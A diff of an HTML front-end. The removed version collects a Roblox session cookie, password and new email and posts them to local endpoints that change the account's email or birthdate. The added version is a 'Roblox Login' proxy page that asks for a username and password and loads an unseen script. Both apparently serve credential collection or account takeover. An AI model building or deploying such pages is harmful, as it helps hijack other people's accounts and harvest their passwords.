@@ -3,89 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Automation API</title>
+    <title>Custom Roblox Login</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: -apple-system, sans-serif; background: #0f0f13; color: #e0e0e0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
-        .card { background: #1a1a24; border: 1px solid #2a2a3a; border-radius: 16px; padding: 36px; width: 100%; max-width: 400px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
-        h1 { font-size: 20px; margin-bottom: 24px; color: #fff; text-align: center; }
-        label { display: block; font-size: 13px; color: #999; margin-bottom: 6px; margin-top: 16px; }
-        input { width: 100%; background: #12121a; border: 1px solid #2a2a3a; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; outline: none; }
-        input:focus { border-color: #0066ff; }
-        .btn-group { display: flex; gap: 10px; margin-top: 24px; }
-        .btn { flex: 1; padding: 14px; border: none; border-radius: 8px; color: #fff; font-size: 14px; font-weight: 600; cursor: pointer; transition: 0.2s; }
-        .btn-bday { background: linear-gradient(135deg, #8b5cf6, #c084fc); }
-        .btn-email { background: linear-gradient(135deg, #0066ff, #00b4ff); }
-        .btn:hover { opacity: 0.9; }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .result { margin-top: 20px; padding: 14px; border-radius: 8px; font-size: 14px; display: none; text-align: center; }
-        .result.success { background: rgba(74,222,128,0.1); color: #4ade80; border: 1px solid rgba(74,222,128,0.3); }
-        .result.error { background: rgba(248,113,113,0.1); color: #f87171; border: 1px solid rgba(248,113,113,0.3); }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background-color: #1e1e1e; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 100%; max-width: 400px; }
+        h2 { text-align: center; margin-top: 0; }
+        .input-group { margin-bottom: 15px; }
+        .input-group label { display: block; margin-bottom: 5px; color: #aaa; }
+        .input-group input { width: 100%; padding: 10px; border: 1px solid #333; border-radius: 5px; background-color: #2a2a2a; color: #fff; box-sizing: border-box; }
+        .input-group input:focus { outline: none; border-color: #3498db; }
+        button { width: 100%; padding: 12px; border: none; border-radius: 5px; background-color: #3498db; color: #fff; font-size: 16px; cursor: pointer; font-weight: bold; transition: background 0.2s; }
+        button:hover { background-color: #2980b9; }
+        button:disabled { background-color: #555; cursor: not-allowed; }
+        #log-container { margin-top: 20px; background-color: #000; padding: 10px; border-radius: 5px; border: 1px solid #333; font-family: monospace; font-size: 12px; white-space: pre-wrap; word-wrap: break-word; max-height: 200px; overflow-y: auto; display: none; }
+        .success { color: #2ecc71; }
+        .error { color: #e74c3c; }
+        .warning { color: #f39c12; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h1>⚙️ Account Setup API</h1>
+
+    <div class="login-card">
+        <h2>API Login Proxy</h2>
         
-        <label>Roblox Cookie</label>
-        <input type="password" id="cookie" placeholder="Paste .ROBLOSECURITY..." />
-
-        <label>Account Password</label>
-        <input type="password" id="password" placeholder="Current password..." />
-
-        <label>New Email (Only for Email Service)</label>
-        <input type="email" id="email" placeholder="New email to attach..." />
-
-        <div class="btn-group">
-            <button class="btn btn-bday" id="bdayBtn" onclick="runService('/api/update-birthdate', 'bdayBtn')">Set Birthdate</button>
-            <button class="btn btn-email" id="emailBtn" onclick="runService('/api/update-email', 'emailBtn')">Set Email</button>
+        <div class="input-group">
+            <label>Username</label>
+            <input type="text" id="username" placeholder="Roblox Username" autocomplete="off">
+        </div>
+        
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="password" placeholder="Roblox Password">
         </div>
 
-        <div class="result" id="result"></div>
+        <button id="login-btn">Secure Login</button>
+
+        <div id="log-container"></div>
     </div>
 
-    <script>
-        async function runService(endpoint, btnId) {
-            const cookie = document.getElementById('cookie').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const email = document.getElementById('email').value.trim();
-
-            if (!cookie || !password) return alert("Cookie and Password are required.");
-            if (endpoint === '/api/update-email' && !email) return alert("Email is required for the Email service.");
-
-            const activeBtn = document.getElementById(btnId);
-            const otherBtn = document.getElementById(btnId === 'bdayBtn' ? 'emailBtn' : 'bdayBtn');
-            const resultEl = document.getElementById('result');
-            
-            activeBtn.disabled = true;
-            otherBtn.disabled = true;
-            const originalText = activeBtn.textContent;
-            activeBtn.textContent = "⏳ Running...";
-            resultEl.style.display = 'none';
-
-            try {
-                const resp = await fetch(endpoint, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cookie, password, email })
-                });
-
-                const data = await resp.json();
-                
-                resultEl.className = 'result ' + (data.success ? 'success' : 'error');
-                resultEl.textContent = data.success ? "✅ " + data.message : "❌ Error: " + data.error;
-                resultEl.style.display = 'block';
-
-            } catch (err) {
-                resultEl.className = 'result error';
-                resultEl.textContent = "❌ Server failed to respond.";
-                resultEl.style.display = 'block';
-            } finally {
-                activeBtn.disabled = false;
-                otherBtn.disabled = false;
-                activeBtn.textContent = originalText;
-            }
-        }
-    </script>
+    <script src="app.js"></script>
 </body>
 </html>
